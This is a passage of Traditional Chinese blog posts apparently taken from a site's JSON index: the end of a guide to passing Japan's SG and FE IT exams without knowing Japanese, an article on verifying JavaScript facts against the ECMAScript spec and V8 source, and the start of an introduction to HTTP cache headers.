這本書最後有個模擬測驗，我記得最後做出來好像是 68 分之類的。 第三步：寫考古題剛剛有附練習的連結了，我是照著年度來寫的，答完題之後講解一定要看，然後可以用 Google 翻譯來看講解。 底下是我寫完第一輪的成績： 平成 28 年春 80% 平成 28 年秋 80% 平成 29 年春 78% 平成 29 年秋 82% 平成 30 年春 86% 平成 30 年秋 72% 平成 31 年春 82% 令和元年秋期 68% 這時候就覺得看書的學習成效有出來了，一方面是有些題目書裡面出現過，另一方面是題目看多了，抓關鍵字的能力變強，看片假名也變快了。 而這時候要開始要學習一些基本的日文跟漢字了。 放心，要學的是很基本的東西，你必須要知道有哪些常見的用法是「否定用法」，否則你就會答錯。 至於要怎麼知道，從答錯的考古題裡面其實滿好搜集的，有些因為你根本不知道是否定而答錯的題目就抄起來，例如說底下是我寫的筆記： できない 不能 せず se zu 表否定 很多動詞接 ず 好像也是否定 なし 沒有 なく 沒有 簡單來說就是看到 なし、なく 跟 せず 就是否定，其他八成都是肯定。 但是會有例外，例如說題目中出現過「なければならない」查了之後發現是「必須」的意思，你以為是否定其實是肯定。像是這種我就直接放掉，真的出現就分數送他，因為太長了我記不起來。 除此之外，有些漢字猜不太出來意思也需要特別記一下，像是： 手口：作案手法 手間：時間、費時 役割：角色 見直し：審查 調達：採購 目安：標準 働く人：員工 手当：津貼 取引：交易 勝手：自私 任意 取組：努力 取扱：處理 口座：帳戶 這些都是會在考古題看到的漢字，反正看不懂的你就寫起來就對了。 到這邊我們已經接近完全體了，這時候的你： 基礎知識充足，靠著書本又複習了一遍 很會讀片假名，題目中出現的片假名八成都能知道英文的意思 大致上看得懂日文的基本否定用法（就我前面講的那三招 なし、なく 跟 せず） 知道題目中會出現的漢字是什麼意思 做到這裡以後，可以再寫一遍考古題複習，我自己是懶得全寫，挑了其中幾年的，分數如下： 平成 28 年春 80% &#x3D;&gt; 94% 平成 28 年秋 80% &#x3D;&gt; 96% 平成 30 年秋 72% &#x3D;&gt; 98% 令和元年秋期 68% &#x3D;&gt; 90% 代表之前錯的題目有好好複習過了。 考試策略總結前提： 考試的相關知識原本就是夠的（至少理解六七成） 對考試有自信 學習以及考試策略： 學習片假名，看懂翻成片假名的英文技術名詞 看書複習片假名以及其他知識 看書學習原本不懂的知識 寫考古題熟悉題目 靠著考古題找出日文常見否定用法 靠著考古題找出看不懂的漢字 之所以這樣的考試策略有用，有很大一部分是因為這是 IT 的考試，所以題目中很常出現片假名，再加上原本日文裡面就很常用漢字，就算不懂日文，也能靠漢字猜出題目大概在講什麼。 這有點像是以前考多益什麼的，英文聽力的策略就是抓關鍵字，你關鍵字有抓到，不需要完全聽懂也可以答題。 考試如何進行？SG 跟 FE 原本都要去實體的考場，而且一年才考兩次。 剛好這兩個考試從 2023 年 4 月開始變成隨報隨考，而且沒考過的話一個月後可以再考一次，考試方式則是 CBT 電腦考試，報名費用是 7500 日幣。 身為完全不會日文的人，事先熟悉考試流程跟系統用法是很重要的，可以參考我之前搜集的資源： 也是 CBT 考試，介面差不多https://www.youtube.com/watch?v=dN7z4Y9MO_Mhttps://www.youtube.com/watch?v=xDmhY4Il8yM 官方的畫面，唯一差別在於我們考的沒有報告可以印https://www.youtube.com/watch?v=SFZI17TMeSU 同個系統但不同考試的流程，很類似https://jpsk.jp/articles/cbtguide.html?p=2 當天報到記得要帶證件，你人已經在日本可以帶在留卡，像我的話是帶護照。 去的時候我就直接拿出手機畫面給櫃檯的接待人員看（前一天會寄提醒信），接著就跟我要證件核對身份，核對身份完以後就會給你看一張單子，上面有你的名字，叫你打勾確認，確認完閱讀一下考試規則後簽名。 簽完名之後要先把身上的東西都放到旁邊的置物櫃裡面，接著你會拿到一個 L 夾，裡面有： 剛剛你簽的單子，上面有等等登入的帳號密碼 考試操作說明 你要坐哪個位子的牌子 筆 計算紙 接著就走進考場找到相對應的位子，用滑鼠點擊 IPA 考試之後輸入紙上的帳號密碼登入，就開始測驗了。 會先有一個三分鐘的簡短教學教你怎麼使用，內容跟我上面貼的影片差不多，我覺得系統其實滿直覺滿好用的。 整個考完以後會直接看到分數，然後不會有成績單直接印出來，把系統登出以後就回去考試櫃檯把你剛帶進去的所有東西還他，計算紙也不能帶走，全部都要還他。他就會跟你講說辛苦了，恭喜你考完（我聽不懂日文，所以是猜的）。 考試的心得以及分數從開始背五十音到上考場考試，大概是一個月的準備時間，實際是多少小時我就沒算了，有些上班日是下班以後才準備，假日或是當天有請假的話，就會花更久一點在看書。 我第一天考了 SG，分數是 745 分。 原本我只報 SG，想說集中心力在這一科，但我後來在準備時發現 B 科目題目有點長我怕我看不完，而且日文字更多了，怕考試策略失效，所以我當時的策略是在 A 科目拿到 80% 以上，如此一來 B 科目 12 題全掛也沒差。 可是後來我看了一下 FE 的考古題，發現 FE 的 B 科目很多程式碼，我就在想搞不好對我比較有利，就順便報名了 FE 的考試，反正考不過頂多一個月以後再來嘛。 所以 FE 我基本上沒什麼看，考古題寫了 20 題就覺得好累好麻煩就不管了。 而實際在考 SG 的時候，時間是比想像中夠用的，寫完大概剩個 20 分鐘左右，我檢查了 10 分鐘以後就交卷了。 至於 FE 的話是第二天考，考出來 A 科目是 715 分，B 科目是 905，沒想到裸考的成績比我想像中的還高。 A 科目時間很緊，我寫完以後幾乎沒什麼時間可以檢查，大概剩個五分鐘左右而已，我覺得只要你以前計算機概論教的東西沒有全部忘光，就滿有勝算的。另外就是 A 科目也會考一些資安的東西，跟 SG 重疊，因此資安的部分有幫我加一些分數，看來兩個考試一起考還是有點優勢的。 反倒是 B 科目比想像中簡單不少，我做完之後還有時間全部驗算一遍，考的當下就知道分數一定不會太差。 最後總結一下，我認為我的考試策略是有效的，確實可以在完全看不懂日文平假名的狀況下，靠著片假名跟漢字去猜出題目跟選項的意思。當然，這並不是說 100% 的題目都這樣，但只要 80% 的題目可以透過這樣讀懂，你再掌握其中的 80%，你就能拿到 64% 的分數，順利通過考試。我們的目標是通過考試，不是學會日文，也不是拿滿分。 不過有一個變因是我不確定題目難度是否會變動，也搞不好我能考出這樣的成績是因為我幸運點比較高，所以題目比較簡單。而且我考的時間點是新制度剛上線，也說不定主辦單位還在調整難度，未來可能會變得更難。 然後那兩個考古題網站有留言板讓大家交換考試心得，可以看到其他背景的人怎麼唸書怎麼複習，以及最後考出來的分數是多少： SG https://www.sg-siken.com/bbs/1487.html FE https://www.fe-siken.com/bbs/4784.html 總結來說，我覺得如果你未來有想要到日本當工程師但是資格不符，或者是高度人才分數不夠，又跟我一樣不會日文的話，可以試試看我的考試策略，嘗試考個 SG 或是 FE，是我覺得還不錯的投資。 參考資料： 日本软考之基本情报技术者 这可能是最详细的【情報処理技術者試験】解说文章（附复习网站）","link":"/2023/04/14/how-to-prepare-japan-fe-and-sg-exam/"},{"title":"你知道的 JavaScript 知識都有可能是錯的","text":"談完了 JavaScript 的歷史以及包袱以後，我們來談談 JavaScript 本身。 不知道大家有沒有想過一個問題，當你看到一本 JavaScript 書籍或是教學文章的時候，你要怎麼知道作者沒有寫錯？要怎麼知道書裡講的知識是正確的？就如同標題所說，會不會你以前知道的 JavaScript 知識其實是錯的？ 因為作者常寫技術文章，所以就相信他嗎？還是說看到 MDN 上面也是這樣寫，因此就信了？又或是大家都這樣講，所以鐵定沒錯？ 有些問題是沒有標準答案的，例如說電車難題，不同的流派都會有各自認可的答案，並沒有說哪個就一定是對的。 但幸好程式語言的世界比較單純，當我們提到 JavaScript 的知識時，有兩個地方可以讓你驗證這個知識是否正確，第一個叫做 ECMAScript 規格，第二個大家可以先想想，我們待會再提。 ECMAScript1995 年的時候 JavaScript 正式推出，那時候只是個可以在 Netscape 上跑的程式語言，如果想要保證跨瀏覽器的支援度的話，需要的是一個標準化的規範，讓各家瀏覽器都遵循著標準。 在 1996 年時網景聯繫了 Ecma International（European Computer Manufacturers Association，歐洲電腦製造商協會），成立了新的技術委員會（Technical Committee），因為是用數字來依序編號，那時候正好編到 39，就是我們現在熟悉的 TC39。 1997 年時，正式發佈了 ECMA-262 第一版，也就是我們俗稱的 ECMAScript 第一版。 為什麼是叫做 ECMAScript，而不是 JavaScript 呢？因為 JavaScript 在那時已經被 Sun 註冊為商標，而且不開放給 Ecma 協會使用，所以沒辦法叫做 JavaScript，因此後來這個標準就稱之為 ECMAScript 了。 至於 JavaScript 的話，你可以視為是去實作 ECMAScript 這個規範的程式語言。當你想知道某個 JavaScript 的功能的規範是什麼，去看 ECMAScript 準沒錯，詳細的行為都會記載在裡面。 而標準是會持續進化的，幾乎每一年都會有新的標準出現，納入新的提案。例如說截止撰寫當下，最新的是 2021 年推出的 ECMAScript 第 12 版，通常又被稱之為 ES12 或是 ES2021，大家常聽到的 ES6 也被稱為 ES2015，代表是在 2015 年推出的 ECMAScript 第 6 版。 如果你對 ECMAScript 的歷史以及這些名詞有興趣，可以參考底下文章： JavaScript 二十年：創立標準 Day2 [JavaScript 基礎] 淺談 ECMAScript 與 JavaScript JavaScript 之旅 (1)：介紹 ECMA、ECMAScript、JavaScript 和 TC39 接著，我們就來簡單看看 ECMAScript 的規格到底長什麼樣子。 初探 ECMAScriptECMAScript 的所有版本都可以在這個頁面中找到：https://www.ecma-international.org/publications-and-standards/standards/ecma-262/ 可以直接下載 PDF 檔，也可以用線上的 HTML 版本觀看，我會建議大家直接下載 PDF，因為 HTML 似乎是全部內容一起載入，所以要載很久，而且有分頁當掉的風險。 我們打開 ES2021 的規格，會發現這是一個有著 879 頁的超級龐大文件。規格就像是字典一樣，是讓你拿來查的，不是讓你一頁一頁當故事書看的。 但只要能善用搜尋功能，還是很快就可以找到我們想要的段落。底下我們來看看三個不同種類的功能的規格。 String.prototype.repeat搜尋「String.prototype.repeat」，可以找到目錄的地方，點了目錄就可以直接跳到相對應的段落：22.1.3.16 String.prototype.repeat，內容如下： 大家可以自己先試著讀一遍看看。 規格這種東西其實跟程式有點像，就像是虛擬碼（pseudo code）那樣，所以有很多程式的概念在裡面，例如說上面你就會看到有很多 function call，需要去查看其他 function 的定義才能了解確切到底做了什麼。不過，許多函式從命名就可以推測出做的事情，可見函式命名真的很重要。 上面的規格中基本上告訴了我們兩件以前可能不知道的事情： 呼叫 repeat 時如果 count 是負數或是無限大，就會出錯 repeat 似乎不是只有字串可以用 第二點其實在 JavaScript 中是滿重要的一件事情，在 ECMAScript 你也會很常看到類似的案例，寫著：「The xxx function is intentionally generic」，這是什麼意思呢？ 不知道你有沒有注意到前兩個步驟，分別是： Let O be ? RequireObjectCoercible(this value). Let S be ? ToString(O). 我們不是已經是字串了嗎？為什麼還要再 ToString？又為什麼跟 this 有關？ 當我們在呼叫 &quot;abc&quot;.repeat(3) 的時候，其實是在呼叫 String.prototype.repeat 這個函式，然後 this 是 &quot;abc&quot;，因此可以視為是 String.prototype.repeat.call(&quot;abc&quot;, 3)。 既然可以轉換成這樣的呼叫方式，就代表你也可以傳一個不是字串的東西進去，例如說：String.prototype.repeat.call(123, 3)，而且不會壞掉，會回傳 &quot;123123123&quot;，而這一切都要歸功於規格定義時的延展性。 剛剛我們有在規格中看到它有特別寫說這個函式是故意寫成 generic 的，為的就是不只有字串可以呼叫，只要「可以變成字串」，其實都可以使用這個函式，這也是為什麼規格中的前兩步就是把 this 轉成字串，這樣才能確保非字串也可以使用。 再舉一個更奇耙的例子： function a()&#123;console.log('hello')&#125; const result = String.prototype.repeat.call(a, 2) console.log(result) // function a()&#123;console.log('hello')&#125;function a()&#123;console.log('hello')&#125; 因為函式可以轉成字串，所以當然也可以丟進去 repeat 裡面，而函式的 toString 方法會回傳函式的整個程式碼，因此才有了最後看到的輸出。 有關於 prototype 跟上面這些東西，我們之後提到 prototype 時應該會再講一次。 總之呢，從規格中我們看出 ECMAScript 的一個特性，就是故意把這些內建的方法做得更廣泛，適用於各種型態，只要能轉成字串都可以丟進去。 typeof一樣在 PDF 中搜尋 typeof，會找到 13.5.3 The typeof Operator，內容如下： 可以看到 typeof 會先對傳入的值進行一些內部的操作，像是 IsUnresolvableReference 或是 GetValue 之類的，但通常我們關心的只有下面那張表格，就是每個型態會回傳的東西。 表格中可以看到兩件有趣的事情，第一件事情就是著名的 bug，typeof null 會回傳 object，這個 bug 到今天已經變成了規格的一部分。 第二件事情是對於規格來說，object 跟 function 其實內部都是 Object，只差在有沒有實作 [[Call]] 這個方法。 事實上，如果看其他段落的話，你也可以看到在規格中多次使用了 function object 這個說法，就可以知道在規格中 function 就只是「可以被呼叫（callable）的物件」 Comments接著我們來看一下註解的語法，搜尋 comments，可以找到 12.4 Comments，底下是部分截圖： 可以看到 ECMAScript 是怎麼表示語法的，由上讀到下，Comment 分成兩種，MultiLineComment 跟 SingleLineComment，而底下有各自的定義，MultiLineComment 就是 /* MultiLineCommentChars */，那個黃色小字 opt 指的是 optional，意思就是沒有 MultiLineCommentChars 也可以，例如說 /**/，而底下又繼續往下定義，我就不再一一解釋了。 單行註解的地方則是這樣： 其實意思跟多行註解差不多，而最後一行則是把我們引導至了 B.1.3，我們來看一下那邊的內容： 這邊額外定義了 HTML-like Comments，看起來除了一些特殊狀況之外，都是合法的用法。 我們可以看到這裡將註解的定義再額外增加了三種： SingleLineHTMLOpenComment SingleLineHTMLCloseComment SingleLineDelimitedComment 從規格中我們可以得到新的冷知識，那就是單行註解其實不只有 //，連 HTML 的也可以使用： &lt;!-- 我是註解 console.log(1) // 我也是 console.log(2) --> 我也是 console.log(3) 這就是只能從規格中才能看到的 JavaScript 冷知識。 當有人告訴你 JavaScript 的註解只有 // 跟 /* */ 時，你只要有看過 ECMAScript 規格，就可以知道他講的是錯的，其實不只。 以上就是我們從 ECMAScript 中找出的三個小段落，主要是想讓大家稍微看一下規格長什麼樣子。 如果你對閱讀規格有興趣的話，我會建議大家先去看 ES3 的規格，因為 ES3 比起前兩版完整度高了許多，而頁數又少，只有 188 頁而已，是可以當作一般書籍來看，可以一頁一頁翻的那種。 雖然說從 ES6 以後規格的用詞跟底層的機制有一些變動，但我認為從 ES3 開始看規格還是挺不錯的，至少可以用最少的力氣去熟悉規格。 若是看一看開始對規格產生興趣，想要仔細研究的話，可以參考底下兩篇文章： 翻譯 如何閱讀 ECMAScript Specification 中文版 V8 blog - Understanding ECMAScript 前面我們有提到過有兩個地方可以讓你驗證 JavaScript 的知識是否正確，第一個是 ECMAScript 規格，而第二個則是請大家先自己想一想。 現在要來公布答案了，第二個就是：「JavaScript 引擎原始碼」。 淺談 JavaScript 引擎原始碼ECMAScript 規格定義了一個程式語言「應該如何」，但實際上到底是怎麼樣，就屬於「實作」的部分了，就像是 PM 定義了一個產品規格，但工程師有可能漏看導致實作錯誤，也有可能因為各種原因沒辦法完全遵守規格，會產生一些差異。 所以假如你在 Chrome 上面發現了一個奇怪的現象，去查了 ECMAScript 規格後也發現行為不同，很有可能就是 Chrome 裡 JavaScript 引擎的實作其實跟規格不一樣，才導致這種差異。 規格只是規格，最後我們使用時還是要看引擎的實作為何。 以 Chrome 來說，背後使用一個叫做 V8 的 JavaScript 引擎，如果你對 JS 引擎一無所知，可以先看一下這個影片：Franziska Hinkelmann: JavaScript engines - how do they even? | JSConf EU。 而如果想要看 V8 的程式碼，可以看官方版：https://chromium.googlesource.com/v8/v8.git，也可以看這個在 GitHub 上的版本：https://github.com/v8/v8 在看 ECMAScript 規格時，我們看了三個不同的功能，底下就讓我們來看看這些功能在 V8 中是怎麼被實作的。 String.prototype.repeat在 V8 中有一個程式語言叫做 Torque，是為了更方便去實作 ECMAScript 中的邏輯而誕生的，語法跟 TypeScript 有點類似，詳情可參考：V8 Torque user manual 有關於 String.prototype.repeat 的相關程式碼在這：src&#x2F;builtins&#x2F;string-repeat.tq // https://tc39.github.io/ecma262/#sec-string.prototype.repeat transitioning javascript builtin StringPrototypeRepeat( js-implicit context: NativeContext, receiver: JSAny)(count: JSAny): String &#123; // 1. Let O be ? RequireObjectCoercible(this value). // 2. Let S be ? ToString(O). const s: String = ToThisString(receiver, kBuiltinName); try &#123; // 3. Let n be ? ToInteger(count). typeswitch (ToInteger_Inline(count)) &#123; case (n: Smi): &#123; // 4. If n &lt; 0, throw a RangeError exception. if (n &lt; 0) goto InvalidCount; // 6. If n is 0, return the empty String. if (n == 0 || s.length_uint32 == 0) goto EmptyString; if (n > kStringMaxLength) goto InvalidStringLength; // 7. Return the String value that is made from n copies of S appended // together. return StringRepeat(s, n); &#125; case (heapNum: HeapNumber): deferred &#123; dcheck(IsNumberNormalized(heapNum)); const n = LoadHeapNumberValue(heapNum); // 4. If n &lt; 0, throw a RangeError exception. // 5. If n is +∞, throw a RangeError exception. if (n == V8_INFINITY || n &lt; 0.0) goto InvalidCount; // 6. If n is 0, return the empty String. if (s.length_uint32 == 0) goto EmptyString; goto InvalidStringLength; &#125; &#125; &#125; label EmptyString &#123; return kEmptyString; &#125; label InvalidCount deferred &#123; ThrowRangeError(MessageTemplate::kInvalidCountValue, count); &#125; label InvalidStringLength deferred &#123; ThrowInvalidStringLength(context); &#125; &#125; 可以看到註解其實就是規格的內容，而程式碼就是直接把規格翻譯過去，真正在實作 repeat 的程式碼則是這一段： builtin StringRepeat(implicit context: Context)( string: String, count: Smi): String &#123; dcheck(count >= 0); dcheck(string != kEmptyString); let result: String = kEmptyString; let powerOfTwoRepeats: String = string; let n: intptr = Convert&lt;intptr>(count); while (true) &#123; if ((n &amp; 1) == 1) result = result + powerOfTwoRepeats; n = n >> 1; if (n == 0) break; powerOfTwoRepeats = powerOfTwoRepeats + powerOfTwoRepeats; &#125; return result; &#125; 從這邊可以看到一個有趣的小細節，那就是在 repeat 的時候，並不是直接跑一個 1 到 n 的迴圈，然後複製 n 遍，這樣太慢了，而是利用了平方求冪的演算法。 舉例來說，假設我們要產生 &#39;a&#39;.repeat(8)，一般的做法需要 7 次加法，但其實我們可以先加一次產生 aa，然後再互加產生 aaaa，最後再互加一次，就可以用三次加法做出 8 次重複（2^3 = 8），省下了不少字串相加的操作。 從中可以看出，像是 JavaScript 引擎這種接近底層的實作，必須要把效能也考慮在內。 typeofV8 裡面對於 typeof 的定義在這裡，註解裡面一樣有寫到相關的 spec 段落：src&#x2F;objects&#x2F;objects.h#466 // ES6 section 12.5.6 The typeof Operator static Handle&lt;String> TypeOf(Isolate* isolate, Handle&lt;Object> object); 實作則是在這邊：src&#x2F;objects&#x2F;objects.cc#870 // static Handle&lt;String> Object::TypeOf(Isolate* isolate, Handle&lt;Object> object) &#123; if (object->IsNumber()) return isolate->factory()->number_string(); if (object->IsOddball()) return handle(Oddball::cast(*object).type_of(), isolate); if (object->IsUndetectable()) &#123; return isolate->factory()->undefined_string(); &#125; if (object->IsString()) return isolate->factory()->string_string(); if (object->IsSymbol()) return isolate->factory()->symbol_string(); if (object->IsBigInt()) return isolate->factory()->bigint_string(); if (object->IsCallable()) return isolate->factory()->function_string(); return isolate->factory()->object_string(); &#125; 可以看到裡面針對各種型態都進行了檢查。 有些人可能會很好奇上面的 Oddball 是什麼，null、undefined、true 跟 false 都是用這個型態來存的，詳細原因我也不太清楚，想深入研究可參考： Learning Google V8 Playing with Node&#x2F;V8 postmortem debugging V8源码边缘试探-黑魔法指针偏移 不過如果 Oddball 裡面已經包含了 undefined，為什麼底下還有一個檢查，也會回傳 undefined 呢？這個 undetectable 是什麼呢？ if (object->IsUndetectable()) &#123; return isolate->factory()->undefined_string(); &#125; 這一切的一切都是因為一個歷史包袱。 在那個 IE 盛行的年代，有一個 IE 專屬的 API，叫做：document.all，可以用 document.all(&#39;a&#39;) 來拿到指定的元素。而那時候也因為這個 IE 專屬的功能，流行著一種偵測瀏覽器是否為 IE 的做法： var isIE = !!document.all if (isIE) &#123; // 呼叫 IE 才有的 API &#125; 後來 Opera 也跟上，實作了 document.all，可是碰到了一個問題，那就是既然實作了，如果網站有用到上面判斷 IE 的方法的話，就會被判定為是 IE，可是 Opera 並沒有那些 IE 專屬的 API，於是網頁就會爆炸，執行錯誤。 Firefox 在實作這個功能時從 Opera 的故事中學到了教訓，雖然實作了 document.all 的功能，可是卻動了一些手腳，讓它沒辦法被偵測到： typeof document.all // undefined !!document.all // false 也就是說，typeof document.all 必須強制回傳 undefined，而且 toBoolean 的時候也必須回傳 false，真是 workaround 大師。 而到後來其他瀏覽器也跟上這個實作，這個實作到最後甚至變成了標準的一環，出現在 B.3.7 The [[IsHTMLDDA]] Internal Slot 之中： 我們在 V8 看到的 IsUndetectable，就是為了實作這個機制而產生，可以在註解裡面看得很清楚，程式碼在 src&#x2F;objects&#x2F;map.h#391： // Tells whether the instance is undetectable. // An undetectable object is a special class of JSObject: 'typeof' operator // returns undefined, ToBoolean returns false. Otherwise it behaves like // a normal JS object. It is useful for implementing undetectable // document.all in Firefox &amp; Safari. // See https://bugzilla.mozilla.org/show_bug.cgi?id=248549. DECL_BOOLEAN_ACCESSORS(is_undetectable) 看到這邊，大家不妨去打開 Chrome devtool，把玩一下 document.all，親自體驗這個歷史包袱。 Chrome 也因為這個歷史包袱，曾經出現過一個 bug，相關的故事可以參考：What is the bug of V8’s typeof null returning “undefined”，上述段落也是參考這篇文章寫的。 Comments前面有提到過 JavaScript 其實還有幾種鮮為人知的註解方式，像是 &lt;!-- 跟 --&gt;，在 V8 中有關於語法的部分，可以看這個檔案：&#x2F;src&#x2F;parsing&#x2F;scanner-inl.h，我們擷取幾個段落： case Token::LT: // &lt; &lt;= &lt;&lt; &lt;&lt;= &lt;!-- Advance(); if (c0_ == '=') return Select(Token::LTE); if (c0_ == '&lt;') return Select('=', Token::ASSIGN_SHL, Token::SHL); if (c0_ == '!') &#123; token = ScanHtmlComment(); continue; &#125; return Token::LT; case Token::SUB: // - -- --> -= Advance(); if (c0_ == '-') &#123; Advance(); if (c0_ == '>' &amp;&amp; next().after_line_terminator) &#123; // For compatibility with SpiderMonkey, we skip lines that // start with an HTML comment end '-->'. token = SkipSingleHTMLComment(); continue; &#125; return Token::DEC; &#125; if (c0_ == '=') return Select(Token::ASSIGN_SUB); return Token::SUB; case Token::DIV: // / // /* /= Advance(); if (c0_ == '/') &#123; base::uc32 c = Peek(); if (c == '#' || c == '@') &#123; Advance(); Advance(); token = SkipSourceURLComment(); continue; &#125; token = SkipSingleLineComment(); continue; &#125; if (c0_ == '*') &#123; token = SkipMultiLineComment(); continue; &#125; if (c0_ == '=') return Select(Token::ASSIGN_DIV); return Token::DIV; 如果碰到 &lt;!，就呼叫 ScanHtmlComment。 如果碰到 --&gt; 而且是在開頭，就呼叫 SkipSingleHTMLComment，這段也告訴了我們一件事，就是 --&gt; 一定要在開頭，不是開頭就會出錯（這邊指的開頭是前面沒有其他有意義的敘述，但空格跟註解是可以的）。 如果碰到 //，檢查後面是不是 # 或是 @，是的話就呼叫 SkipSourceURLComment，這其實就是 source map 的語法，詳情可以參考：sourceMappingURL and sourceURL syntax changed 跟 Source map 運作原理。 不是的話就呼叫 SkipSingleLineComment。 如果是 /* 的話則呼叫 SkipMultiLineComment。 上面呼叫的相對應的函式都在 src&#x2F;parsing&#x2F;scanner.cc 中，我們看一個比較有趣的，碰到 &lt;! 會呼叫的 ScanHtmlComment ： Token::Value Scanner::ScanHtmlComment() &#123; // Check for &lt;!-- comments. DCHECK_EQ(c0_, '!'); Advance(); if (c0_ != '-' || Peek() != '-') &#123; PushBack('!'); // undo Advance() return Token::LT; &#125; Advance(); found_html_comment_ = true; return SkipSingleHTMLComment(); &#125; 這邊會繼續往下看，看後面是不是 --，如果不是的話會復原操作，然後回傳 Token::LT，也就是 &lt;；是的話則呼叫 SkipSingleHTMLComment。 而 SkipSingleHTMLComment 的程式碼也很簡單： Token::Value Scanner::SkipSingleHTMLComment() &#123; if (flags_.is_module()) &#123; ReportScannerError(source_pos(), MessageTemplate::kHtmlCommentInModule); return Token::ILLEGAL; &#125; return SkipSingleLineComment(); &#125; 按照規格中說的，檢查 flags_.is_module() 是不是 true，是的話就拋出錯誤。如果想重現這個狀況，可以新建一個 test.mjs 的檔案，裡面用 &lt;!-- 當作註解，用 Node.js 執行後就會噴錯： &lt;!-- 我是註解 ^ SyntaxError: HTML comments are not allowed in modules 而 &lt;!-- 可以當作註解，也會造成一個很好玩的現象。大多數時候運算子之間有沒有空格，通常不會影響結果，例如說 a+b&gt;3 跟 a + b &gt; 3 結果是一樣的，但因為 &lt;!-- 是一整組的語法，所以： var a = 1 var b = 0 &lt; !--a console.log(a) // 0 console.log(b) // true 執行的過程是先 --a，把 a 變成 0，接著 ! 過後變成 1，然後 0 &lt; 1 是 true，所以 b 就是 true。 但如果把 &lt; !-- 改成 &lt;!--： var a = 1 var b = 0 &lt;!--a console.log(a) // 1 console.log(b) // 0 那就變成沒有任何運算操作，因為 &lt;!-- 後面都是註解，所以就是單純的 var a = 1 跟 var b = 0 而已。 話說在找尋實作的程式碼時，要從茫茫 code 海中找到自己關注的地方不是件容易的事情，分享一個我自己會用的方法，就是 google。直接搜尋關鍵字，或是利用 filter 去幫你搜尋程式碼，像這樣：typeof inurl:https://chromium.googlesource.com/v8/v8.git。 如果程式碼在 GitHub 的話，也可以用這個很好用的網站，叫做 grep.app，可以指定 GitHub repo 去搜尋內容。 結語當你從任何地方（也包括這篇文章）得到關於 JavaScript 的知識時，都不一定是正確的。 如果想確認的話，有兩個層面可以驗證這個知識是否正確，第一個層面是「是否符合 ECMAScript 的規範」，這點可以透過去尋找 ECMAScript 中相對應的段落來達成。我的文章中如果有參考到 ECMAScript，都會盡量附上參考的段落，方便大家自己去驗證。 第二個層面則是「是否符合 JavaScript 引擎的實作」，因為有時候實作不一定會跟規格一致，而且會有時間的問題，例如說已經被納入規範，但還沒實作，或甚至是反過來。 而 JavaScript 引擎其實也不只一個，像是 Firefox 在使用的 SpiderMonkey 就是另一個不同於 V8 的引擎。 如果你看完這篇文章以後想試試看閱讀規格，卻又不知道該從何下手的話，那我來出一個問題，請你從規格中找出答案：「假設 s 是任意字串，請問 s.toUpperCase().toLowerCase() 跟 s.toLowerCase() 是否永遠相等？如果否，請舉一個反例」","link":"/2022/01/30/how-to-validate-javascript-knowledge/"},{"title":"循序漸進理解 HTTP Cache 機制","text":"前言前陣子在研究跟 HTTP Cache 有關的一些東西，看得眼花撩亂，不同的 Header 愈看愈混亂，像是Pragma, Cache-Control, Etag, Last-Modified, Expires 等等。找了許多參考資料閱讀之後才有了比較深刻的理解，想說若是從一個比較不同的角度來理解 Cache，說不定會比較容易了解這些 Header 到底在做什麼。 在之前查的資料裡面，很多篇都是逐一解釋各個 Header 的作用以及參數，而我認為其實參數講多了容易造成初學者混淆，想說怎麼有這麼多奇怪的參數，而且每一個看起來都很像。所以這篇文章嘗試一步一步藉由不同的問題來引導出各個 Header 使用的場景以及出現的目的。還有，因為這篇是給初學者看的，所以不會講到所有的參數。 其實關於 Cache 這一部分，很多網路資源的說法都不太一樣，如果碰到有疑義的地方我會盡量以 RFC 上面寫的標準為主。如果有錯誤的話還麻煩不吝指正，感謝。 為什麼需要 Cache多問為什麼是個好習慣，在你用一個東西之前，必須知道你為什麼要用它。於是，我們需要問自己一個問題：為什麼需要 Cache？ 很簡單，因為節省流量嘛，也節省時間，或是更宏觀地來說，減少資源的損耗。 舉例來說，今天電商網站的首頁可能會有很多商品，如果你今天每一個訪客到首頁你都去資料庫重新抓一次所有的資料，那對資料庫的負擔會非常非常大。 可是呢，其實首頁的這些資訊基本上短期之內是不會變的，一個商品的價格不可能上一秒是一千元，下一秒就變成兩千元。所以這些不常變動的資料就很適合儲存起來，也就是我們說的 Cache，台灣翻譯叫做快取，中國翻譯叫做緩存。 上面這個例子可以把首頁的那些資訊在撈出來一次之後就存在某個地方，例如說 Redis，其實就是以一個簡單的 Key Value Pair 的形式存進去即可，接著只要是用到這些資訊的時候，都可以用極快的速度撈出來，而不是再到資料庫裡面重新算一次。 上面講的是 Server side 的 Cache，藉由把 Database 的資料撈出來之後存到別的地方達成。但 Server side 的 Cache 並不是我們今天的重點，有興趣的讀者們可以參考我之前寫過的：資料庫的好夥伴：Redis。 今天的重點是 Server 跟瀏覽器之間的 Cache 機制。 例如說電商網站的商品圖好了。如果沒有 Cache 的話，那首頁出現的上百張商品圖，只要網頁被瀏覽幾次，就會被下載幾次，這個流量是非常驚人的。所以我們必須讓瀏覽器可以把這些圖片給 Cache 起來。這樣只有第一次瀏覽這個網頁的時候需要重新下載，第二次瀏覽的時候，圖片就可以直接從瀏覽器的快取裡面去抓，不用再跟 Server 拿資料了。 Expires要達成上述的功能，可以在 HTTP Response Header 裡面加上一個Expires的字段，裡面就是這個 Cache 到期的時間，例如說： Expires: Wed, 21 Oct 2017 07:28:00 GMT 瀏覽器收到這個 Response 之後就會把這個資源給快取起來，當下一次使用者再度造訪這個頁面或是要求這個圖片的資源的時候，瀏覽器會檢視「現在的時間」是否有超過這個 Expires。如果沒有超過的話，那瀏覽器「不會發送任何 Request」，而是直接從電腦裡面已經存好的 Cache 拿資料。 若是打開 Chrome dev tool，就會看到它寫著：「Status code 200 (from disk cache)」，代表這個 Request 其實沒有發出去，Response 是直接從 disk cache 裡面拿的。 可是這樣其實會碰到一個問題，因為瀏覽器檢視這個 Expires 的時間是用「電腦本身的時間」，那如果我喜歡活在未來，把電腦的時間改成 2100 年，會怎樣呢？ 瀏覽器就會覺得所有的 Cache 都是過期的，就會重新發送 Request。 Cache-Control 與 max-ageExpires 其實是 HTTP 1.0 就存在的 Header，而為了解決上面 Expires 會碰到的問題，HTTP 1.1 有一個新的 header 出現了，叫做：Cache-Control。（註：Cache-Control 是 HTTP 1.1 出現的 Header，但其實不單單只是解決這個問題，還解決許多 HTTP 1.0 沒辦法處理的快取相關問題） 其中一種用法是：Cache-Control: max-age=30，就代表這個 Response 的過期時間是 30 秒。假設使用者在收到這個 Response 之後的第 10 秒重新整理，那就會出現上面那樣被瀏覽器 Cache 住的現象。 